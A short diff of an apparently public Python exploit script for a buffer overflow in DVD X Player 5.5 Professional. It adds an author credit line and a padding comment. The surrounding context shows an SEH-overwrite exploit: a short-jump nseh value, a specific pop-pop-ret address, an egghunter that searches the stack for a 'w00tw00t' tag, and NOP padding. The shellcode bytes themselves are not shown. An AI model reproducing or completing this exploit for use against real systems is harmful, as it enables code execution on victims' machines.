@@ -1,3 +1,5 @@
+# Author: w4fz5uck5 -> https://github.com/w4fz5uck5
+
 import socket,struct
 
 shellcode = (
@@ -22,7 +24,7 @@ payload += "\xEB\x06\x90\x90" # nseh
 payload += struct.pack("I", 0x6403468B) #pop pop ret (SEH)
 payload += egghunter # The egghunter code will search on stack for the strings
                      # w00tw00t and execute that remain after it
-payload += "\x90" * 300
+payload += "\x90" * 300 # Padding
 
 print "------DVD-X-Player-5.5-Professional-Buffer-Overflow-SEH+Egghunting------"
 try:
